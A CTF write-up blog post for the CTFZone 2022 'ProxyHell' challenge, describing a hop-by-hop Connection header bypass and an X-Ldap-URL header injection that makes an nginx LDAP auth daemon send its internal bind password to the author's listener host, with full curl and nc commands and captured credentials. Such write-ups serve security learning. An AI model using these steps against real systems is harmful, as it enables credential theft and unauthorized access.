+++
author = "sh1yo"
title = "[CTFZone 2022] ProxyHell"
date = "2022-08-27"
description = "We can't change our old infrastructure, so we're using 4 proxies to access the flag. What could possibly go wrong?"
tags = [
    "ctf",
    "proxy"
]
+++

![img](/images/Kf0vgmuWZ4v3jdLAgTMCQWuDehuH2rAM)

I do like proxy-related challenges, so I decided to share my solution for the [CTFZone](https://ctf.bi.zone) ProxyHell challenge. Despite it wasn’t a hard task, only 3 teams solved it in the end.

## Initial observing

We have a `docker-compose.yml` file with 5 images - **apache**, **varnish**, **nginx-ldap**, **nginx**, **openldap**. If we do `grep -r flag`, we will see that the flag is within the `index.html` page: `app/index.html:<h1>CTFZone{Test_flag}</h1>`. If we try to access the root of the server -- we will get a **403 forbidden** error:

```html
% curl http://proxyhell.ctfz.one/

<html>
<head><title>403 Forbidden</title></head>
<body>
<center><h1>403 Forbidden</h1></center>
<hr><center>nginx</center>
</body>
</html>
```

Let's try to find what part of the application causes this error:
```bash
% grep -r 403

conf/ldap_nginx.conf:            return 403;
```

And `conf/ldap_nginx.conf` looks like:

```python3
server {
      listen 0.0.0.0:8080;

      location = / {
      if ($http_x_real_ip) { #!
            return 403;
        }
         auth_request /auth-proxy;
      }

      location = /auth-proxy {
         internal;

         proxy_pass http://nginx-ldap:8888;

      }
}
```

As we can see - the nginx throws 403 error in case the `X-Real-Ip` header is set.

It is set by varnish:

`varnish/default.vcl:`
```python3
...
sub vcl_recv {
    if (req.method != "GET" && req.method != "HEAD") {
        return (pass);
    }

    if (req.http.cookie ~ "^\s*$") {
        unset req.http.cookie;
    }

    set req.http.X-Real-Ip = client.ip; #!
    var.global_set("conn_string", req.http.connection);
}
...
```

## Hop-by-hop headers

After seeing this condition, I tried to bypass it using the `Connection: X-Real-Ip` header, and it worked:

```html
% curl http://proxyhell.ctfz.one/ -H "Connection: X-Real-Ip"

<html>
<head><title>401 Authorization Required</title></head>
<body>
<center><h1>401 Authorization Required</h1></center>
<hr><center>nginx</center>
</body>
</html>
```

It works because the `Connection` header is treated as **hop-by-hop** in **HTTP/1.1**. It means the proxy itself should consume the header and not forward it further. So it turned out that one of the proxies in the chain decided to follow the rules and removed the `X-Real-Ip` from the request, so we got another error.

Here is a great blog post explaining the hop-by-hop headers - [Abusing HTTP hop-by-hop request headers](https://nathandavison.com/blog/abusing-http-hop-by-hop-request-headers)

## Ldap server

Let's see what is causing the error this time:

```bash
% grep -r 401
nginx-ldap/nginx-ldap-auth-daemon.py:            self.send_response(401)
nginx-ldap/nginx-ldap-auth-daemon.py:        self.send_response(401)
```

The file `nginx-ldap/nginx-ldap-auth-daemon.py` has the following structure:

```python
class AuthHandler(BaseHTTPRequestHandler)
    def do_GET(self)
    def get_params(self)
    def get_cookie(self, name)
    def auth_failed(self, ctx, errmsg=None)

class LDAPAuthHandler(AuthHandler)
    params = {..}
    def do_GET(self)

def main()
```

omitting some useless functions.

After a few minutes of setting up `print's()`, I found that the `AuthHandler -> do_GET(self)` function causes the error:

```python
class AuthHandler(BaseHTTPRequestHandler)

 def do_GET(self):

        ctx = self.ctx

        ctx['action'] = 'input parameters check'
        for k, v in self.get_params().items():
            ctx[k] = self.headers.get(v[0], v[1])
            if ctx[k] == None:
                self.auth_failed(ctx, 'required "%s" header was not passed' % k)
                return True

        ctx['action'] = 'performing authorization'
        auth_header = self.headers.get('Authorization') #!
        auth_cookie = self.get_cookie(ctx['cookiename'])

        if auth_cookie != None and auth_cookie != '':
            auth_header = "Basic " + auth_cookie
            self.log_message("using username/password from cookie %s" %
                             ctx['cookiename'])
        else:
            self.log_message("using username/password from authorization header")

        if auth_header is None or not auth_header.lower().startswith('basic '): #!
            self.send_response(401)
            self.send_header('WWW-Authenticate', 'Basic realm="' + ctx['realm'] + '"')
            self.send_header('Cache-Control', 'no-cache')
            self.end_headers()
```

We're getting a 401 error because `self.headers.get('Authorization')` is `None`.
Let's take some credentials from the `docker-compose.yml` file and try to send a request with this header:

`docker-compose.yml:`
```yaml
...
openldap:
    image: bitnami/openldap
    expose:
      - "1389"
      - "1636"
    environment:
      - LDAP_ADMIN_USERNAME=admin
      - LDAP_ADMIN_PASSWORD=adminpassword
      - LDAP_USERS=admin
      - LDAP_PASSWORDS=adminpassword
```

```bash
% echo -n "admin:adminpassword" | base64

YWRtaW46YWRtaW5wYXNzd29yZA==
```

```html
% curl localhost -H "Connection: X-Real-Ip" -H "Authorization: basic YWRtaW46YWRtaW5wYXNzd29yZA=="

<html>
<body>
<h1>CTFZone{Test_flag}</h1>
</body>
</html>
```

We're getting the flag. If we check docker-compose logs, new requests to the ldap server were made:

Without `Authorization` header:
![img](/images/HaVyyAev8-I1j9Jh1cq8WXGDs9O5wl2U)

With `Authorization` header:
![img](/images/MloM3BRMp1tENV9wpp2iPdlOnEtFm52-)

But it isn't a solution because the real server has a different admin password.
If we try to supply an invalid password in the `Authorization` header we are getting the same 401 error, but this time it is caused by `AuthHandler -> auth_failed(self, ctx, errmsg=None)`:

```python
class AuthHandler(BaseHTTPRequestHandler)

 def auth_failed(self, ctx, errmsg=None):

        msg = 'Error while ' + ctx['action']
        ...
        if ctx.get('url'):
            msg += ', server="%s"' % ctx['url']

        if ctx.get('user'):
            msg += ', login="%s"' % ctx['user']

        self.send_response(401)
        ...
```

And this function is called by `LDAPAuthHandler -> do_GET(self)`:

```python
class LDAPAuthHandler(AuthHandler)

 def do_GET(self):

        ctx = dict()
        self.ctx = ctx

        ctx['action'] = 'initializing basic auth handler'
        ctx['user'] = '-'

        ...

        try:
            # check that uri and baseDn are set
            # either from cli or a request
            if not ctx['url']:
                self.log_message('LDAP URL is not set!')
                return
            if not ctx['basedn']:
                self.log_message('LDAP baseDN is not set!')
                return

            ctx['action'] = 'initializing LDAP connection'
            ldap_obj = ldap.initialize(ctx['url']);

            ...

            ctx['action'] = 'binding as search user'
            print(ctx['binddn'], ctx['bindpasswd'])
            ldap_obj.bind_s(ctx['binddn'], ctx['bindpasswd'], ldap.AUTH_SIMPLE)

            ctx['action'] = 'preparing search filter'
            searchfilter = ctx['template'] % {'username': ctx['user']}

            self.log_message(('searching on server "%s" with base dn ' + \
                              '"%s" with filter "%s"') %
                             (ctx['url'], ctx['basedn'], searchfilter))

            ctx['action'] = 'running search query'
            results = ldap_obj.search_s(ctx['basedn'], ldap.SCOPE_SUBTREE,
                                        searchfilter, ['objectclass'], 1)

            ctx['action'] = 'verifying search query results'

            nres = len(results)

            if nres < 1:
                self.auth_failed(ctx, 'no objects found')
                return

            if nres > 1:
                self.log_message("note: filter match multiple objects: %d, using first" % nres)

            user_entry = results[0]
            ldap_dn = user_entry[0]

            if ldap_dn == None:
                self.auth_failed(ctx, 'matched object has no dn')
                return

            self.log_message('attempting to bind using dn "%s"' % (ldap_dn))

            ctx['action'] = 'binding as an existing user "%s"' % ldap_dn

            ldap_obj.bind_s(ldap_dn, ctx['pass'], ldap.AUTH_SIMPLE)

            self.log_message('Auth OK for user "%s"' % (ctx['user']))

            # Successfully authenticated user
            self.send_response(200) #!
            self.end_headers()

        except:
            self.auth_failed(ctx)
```

In a few words: this code connects to the ldap server with internal creds and then tries to search for a user, supplied via the `Authorization` header. In case there's a user with such a username -- it tries to connect to the ldap server again using the creds provided in the `Authorization` header. In case the connection successful, we are getting the **200 OK** response.

So it looks like to get the flag we need to have at least one pair of a valid `user:pass` combination? Okay, it's wrong. There're interesting variables in the `params` dict of the `LDAPAuthHandler` class:

```python
    params = {
        # parameter      header         default
        'realm': ('X-Ldap-Realm', 'Restricted'),
        'url': ('X-Ldap-URL', None),
        'starttls': ('X-Ldap-Starttls', 'false'),
        'disable_referrals': ('X-Ldap-DisableReferrals', 'false'),
        'basedn': ('X-Ldap-BaseDN', None),
        'template': ('X-Ldap-Template', '(cn=%(username)s)'),
        'binddn': ('X-Ldap-BindDN', ''),
        'bindpasswd': ('X-Ldap-BindPass', ''),
        'cookiename': ('X-CookieName', '')
    }
```

Notice the `X-Ldap-URL` header. Let's try to point it to our arbitrary server pretending that we don't know a valid password:

```bash
% echo -n "admin:wrong" | base64
YWRtaW46d3Jvbmc=
```
```html
% curl localhost -H "Connection: X-Real-Ip" -H "Authorization: basic YWRtaW46d3Jvbmc=" -H "X-Ldap-URL: ldap://4rt.one:100"
<html>
<head><title>500 Internal Server Error</title></head>
<body>
<center><h1>500 Internal Server Error</h1></center>
<hr><center>nginx</center>
</body>
</html>
```

And if we check our server:

```bash
root@4rt.one ~ # nc -lp 100
adminpassword,dc=example,dc=org�
```

So we were able to overwrite the default ldap server, and the nginx ldap thing tried to connect to our server with the internal password!

UPD. it turned out that the vulnerable nginx-ldap server was from the official [nginxinc github](https://github.com/nginxinc/nginx-ldap-auth). And the security advisory is posted [here](https://www.nginx.com/blog/addressing-security-weaknesses-nginx-ldap-reference-implementation/).

## Exploit

So the full exploit is:

1. Connect to the server with our server in the `X-Ldap-Header`:
```html
% curl proxyhell.ctfz.one -H "Connection: X-Real-Ip" -H "Authorization: basic YWRtaW46d3Jvbmc=" -H "X-Ldap-URL: ldap://4rt.one:100"
<html>
<head><title>500 Internal Server Error</title></head>
<body>
<center><h1>500 Internal Server Error</h1></center>
<hr><center>nginx</center>
</body>
</html>
```

2. Check logs of our server:
```bash
root@4rt.one ~ # nc -lp 100
0A`<▒cn=admin,dc=example,dc=org�@dminpasswordisverysecure!2
```
*If you don't see a full password you can try to pipe the output of nc to xxd: `nc -lp 100 | xxd`*

3. Resend the request with a valid authorization header:
```bash
% echo -n "admin:@dminpasswordisverysecure\!2" | base64
YWRtaW46QGRtaW5wYXNzd29yZGlzdmVyeXNlY3VyZSEy
```
```html
% curl proxyhell.ctfz.one -H "Connection: X-Real-Ip" -H "Authorization: basic YWRtaW46QGRtaW5wYXNzd29yZGlzdmVyeXNlY3VyZSEy"
<html>
<body>
<h1>CTFZone{W3_l0v3_@_l0t_pr0xy_@nd_bug9_1n_th3m}</h1>
</body>
</html>
```

## Not the end

Right after I solved the challenge, new info was added:

![img](/images/M5DN_Yior5HvAnRG9vSZH84An8Jb3Pbb)
> We have fixed the unintended solution in the task and changed the flag.

Okay, it was way too easy for a hard challenge. That time I thought that it was unintended that it was possible to supply your ldap server and that there was something more interesting hidden in it, but after I resend the previous request:

```html
% curl proxyhell.ctfz.one -H "Connection: X-Real-Ip" -H "Authorization: basic YWRtaW46QGRtaW5wYXNzd29yZGlzdmVyeXNlY3VyZSEy"
<html>
<body>
<h1>CTFZone{W3_l0v3_@_l0t_pr0xy_@nd_bug9_1n_th3m_h0p3_u_3nj0y}</h1>
</body>
</html>
```

**`¯\_(ツ)_/¯`**

About the unintended solution:
> Unintended solution was that you can just request `/index.html` and it will bypass both restrictions.